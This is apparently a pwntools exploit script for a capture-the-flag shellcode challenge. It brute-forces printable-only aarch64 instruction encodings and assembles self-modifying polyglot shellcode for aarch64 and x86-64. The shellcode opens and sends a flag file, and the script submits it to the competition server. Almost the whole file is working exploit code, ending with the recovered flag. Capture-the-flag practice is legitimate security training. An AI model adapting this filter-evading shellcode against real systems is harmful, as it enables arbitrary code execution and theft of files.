from itertools import product
from logging import INFO, info
from tqdm import tqdm
from pwn import *


context.arch = 'aarch64'
# context.arch = 'amd64'
rang = range(0x20, 0x7f+1)

def check(payload):
    assert isinstance(payload, bytes) or isinstance(payload, bytearray)
    for c in payload:
        if not (0x20 <= c <= 0x7f):
            return False
    return True

# for c1, c2 in product(rang, rang):
#     s = disasm(('\x7f\x7f' + chr(c1) + chr(c2)).encode())
#     if 'is out of bounds' not in s and 'undefined' not in s:
#         print(c1, c2, s)

# s = shellcraft.aarch64.xor(0x7f, 'x3', 1)
# s = 'svc #0'
# s = 'add w1, w2, w3'
# b = b'}5 2'

# s = shellcraft.aarch64.cat('/flag')
# print(asm(s))
# print(encoders.encoder.alphanumeric(asm(s)))

# s = 'syscall'

# print(s)
# print(asm(s))

# open('shellcode-amd64', 'wb').write(asm(shellcraft.amd64.cat('/flag')))

# s = '''TAYAXVI31VXPP[_Hc4:14:SX-+6D$-Y)|l54+;]P^14:WX-s>??--abB-\`^~P_Hc4:14:SX-IOO`-@t $5?3??P^14:WX-s>??--abB-\`^~P_Hc4:14:SX-<ih)-F_  5L???P^14:WX-s>??--abB-\`^~P_Hc4:14:SX-wi3$-!O  5l}/|P^14:WX-s>??--abB-\`^~P_Hc4:14:SX-@#,X-J "x5~?w?P^14:WX-s>??--abB-\`^~P_Hc4:14:SX-&!t@-  < 5?~:wP^14:WX-s>??--abB-\`^~P_SX- aDx- `|P5X??7P_Hc4:14:SX-X%0 - @  5wx?/P^14:WX-s>??--abB-\`^~P_SX--!dI- h\y5/w?=P^SX-@a@(-V``x5r>__P_AAAA[V' DI2bXkl|{t@BC.v9co~\kyo3K}>Q ~F#?;!vcEF_`J1 l@?oih<m+RPC|WjJAf/]x4 _vxHWCKmU7=Njw}?Oywo'-SG@wSf$O&plf@$1p@~%'''
# print(disasm(s.encode()))

# print(run_assembly(shellcraft.cat('/flag')).recv())

# print(shellcraft.cat('/flag'))

# x0 and x1 stores the location of shellcode
# available store instructions are
# C3.3.10 STRB, STRH
# C3.3.13 STRB, STRH
# C3.3.14 STP


# STRB x16, x17, #XX

# svc #257 => b'! \x00\xd4'

'''

b1 = 0b10_0010_0010_00 + 24
b2 = b1 + 24
b3 = b1 + 24 + 24

t = sorted(('01', '03', '38', '47', '80', '8c', '9d', '9e', '9f', 'a0', 'a1', 'a2', 'a3', 'a6', 'a7', 'b1', 'ba', 'bb', 'cc', 'd4', 'f1', 'f7'))
t = [int(i, 16) for i in t]
l = {i: None for i in t}

# assert check(asm(f'adds w27, w26, #{base1}')), 'base1'
# assert check(asm(f'adds w27, w26, #{base2}')), 'base2'
# assert check(asm(f'adds w27, w26, #{base3}')), 'base3'

for ii in range(256):
    base1 = b1 + ii
    base2 = b2 + ii
    base3 = b3 + ii
    c1 = check(asm(f'adds w27, w26, #{base1}'))
    c2 = check(asm(f'adds w27, w26, #{base2}'))
    c3 = check(asm(f'adds w27, w26, #{base3}'))
    if c1 + c2 + c3 < 2: continue
    print(ii, c1, c2, c3)
    for i in t:
        s = asm(f'subs w25, w27, #{base1-i}')
        if check(s):
            print(hex(i), 1, disasm(s))
            l[i] = (base1, base1-i)
            continue

        s = asm(f'subs w25, w27, #{base2-i}')
        if check(s):
            print(hex(i), 2, disasm(s))
            l[i] = (base2, base2-i)
            continue

        s = asm(f'subs w25, w27, #{base3-i}')
        if check(s):
            print(hex(i), 3, disasm(s))
            l[i] = (base3, base3-i)
            continue

        print(hex(i), 'nope')

    print(l)
    print()
'''

'''
b1 = 0b10_0011_0110_00
b2 = 0b10_0011_0111_00
b3 = 0b10_0100_0010_00

d = {
    '01': (2460, 2459),
    '03': (2460, 2457),
    '38': (2508, 2452),
    '47': (2460, 2389),
    '80': (2460, 2332),
    '8c': (2460, 2320),
    '9d': (2288, 2131),
    '9e': (2288, 2130),
    '9f': (2288, 2129),
    'a0': (2288, 2128),
    'a1': (2288, 2127),
    'a2': (2288, 2126),
    'a3': (2288, 2125),
    'a6': (2288, 2122),
    'a7': (2288, 2121),
    'b1': (2508, 2331),
    'ba': (2508, 2322),
    'bb': (2508, 2321),
    'cc': (2460, 2256),
    'd4': (2460, 2248),
    'f1': (2508, 2267),
    'f7': (2508, 2261)
}

for k, v in d.items():
    va, vs = v
    assert f'{va-vs:02x}' == k
    print(check(asm(f'adds w27, w26, #{va}')), check(asm(f'subs w28, w27, #{vs}')))
'''












s_aarch64 = asm('''
.inst 0x32207a7d /* orr w29, w11, #0x3fff */

/* prepare */
adds w11, w26, #2271
subs w11, w11, #2056 /* w11 = 0b00_0011_0101_11 = 215 */
adds w11, w11, #2073 /* w11 = 0b10_0011_1100_00 = 2288 */
adds w17, w26, #2460
adds w18, w26, #2508
adds w10, w26, #3036

/* prepare x1 = "flag" */
subs w25, w11, #2131 /* w25 = 0x9d */
subs w9, w10, #2064 /* w9 = 0x03cc */
strh w9, [x1, x25]
subs w25, w11, #2129 /* w25 = 0x9f */
subs w9, w18, #2331 /* w9 = 0xb1 */
strb w9, [x1, x25]

/* prepare x0 = -100 */
subs w25, w11, #2128 /* w25 = 0xa0 */
subs w9, w17, #2332 /* w9 = 0x80 */
strb w9, [x1, x25]
subs w25, w11, #2127 /* w25 = 0xa1 */
subs w9, w10, #2640 /* w9 = 0x018c */
strh w9, [x1, x25]
subs w25, w11, #2125 /* w25 = 0xa3 */
subs w9, w18, #2267 /* w9 = 0xf1 */
strb w9, [x1, x25]

/* prepare svc #257: store 0x00 to 0xa6 and 0xba */
subs w25, w11, #2122 /* w25 = 0xa6 */
strb w26, [x1, x25]
subs w25, w18, #2322 /* w25 = 0xba */
strb w26, [x1, x25]

/* prepare svc #257: store 0xd4 to 0xa7 and 0xbb */
subs w9, w17, #2248 /* w9 = 0xd4 */
subs w25, w11, #2121 /* w25 = 0xa7 */
strb w9, [x1, x25]
subs w25, w18, #2321 /* w25 = 0xbb */
strb w9, [x1, x25]

.inst 0x32203d7d /* orr w29, w11, #0x3fff */
.inst 0x3220307d /* orr w29, w11, #0x3fff */
cbnz w26, 0x40404 /* branch instruction for i-cache flushing */

/* store "\x00" to 0xf7 to end the string "flag" */
subs w25, w18, #2261 /* w25 = 0xf7 */
strb w26, [x1, x25]

/* openat(-100, data_offset, 0, 0) */
subs w2, w17, #2460 /* w2 = 0x0 */
subs w3, w17, #2460 /* w3 = 0x0 */
subs w8, w18, #2452 /* w8 = 0x38 */
.inst 0x41414121 /* (b103cc21) adds x1, x1, #0xf3 */ /* x1 = "flag" */
.inst 0x41414141 /* (f1018c80) subs x0, x4, #0x63 */ /* x0 = -100 */
.inst 0x41413021 /* svc #257 */

/* sendfile(1, 3, 0, 0xf7) */
subs w0, w17, #2459 /* w0 = 0x1 */
subs w1, w17, #2457 /* w1 = 0x3 */
subs w3, w18, #2261 /* w3 = 0xf7 */
subs w8, w17, #2389 /* w8 = 0x47 */
.inst 0x41413021 /* svc #257 */
''', arch='aarch64')

# x86-64 assembly by how2hack
s_x86_64 = asm('''
    push   0x33
    push   rsp
    pop    rcx
    imul   di, WORD PTR [rcx], 0x6d57
    push   rdi
    pop    rcx
    pop    rax
    sub    al, 0x77
    push   rax
    pop    rbx
    xor    al, 0x3c
    xor    BYTE PTR [rbx+rsi*1+0x40],cl
    xor    BYTE PTR [rbx+rsi*1+0x43],ch
    xor    BYTE PTR [rbx+rsi*1+0x47],ch
    xor    BYTE PTR [rbx+rsi*1+0x48],cl
    xor    BYTE PTR [rbx+rsi*1+0x49],cl
    xor    BYTE PTR [rbx+rsi*1+0x44],al
    xor    BYTE PTR [rbx+rsi*1+0x46],al
    xor    BYTE PTR [rbx+rsi*1+0x4d],cl
    xor    BYTE PTR [rbx+rsi*1+0x56],cl
    push   0x67616c66
    xor    BYTE PTR [rbx+rsi*1+0x57],cl
    push   0x57
    pop    rax
    rex.W
    rex.B
    xor    DWORD PTR [esi+0x51], esi
    pop    rdx
    push   rax

    push   rax
    pop    rsi
    push   0x54
    pop    rdi
    push   0x54
    pop    r10
    push   0x28
    pop    rax
    pop    rdx
    push   rax
''', arch='amd64')

s = (s_aarch64 + s_x86_64).ljust(280, b'A')

print('payload:', repr(s))
print('contains only alphanumeric:', check(s))

open('in', 'wb').write(s)

r = remote('shellcode.2021.ctfcompetition.com', 1337)
print(r.sendlineafter('Payload:\n', s).decode())
r.interactive()
# CTF{abc_easy_as_svc}
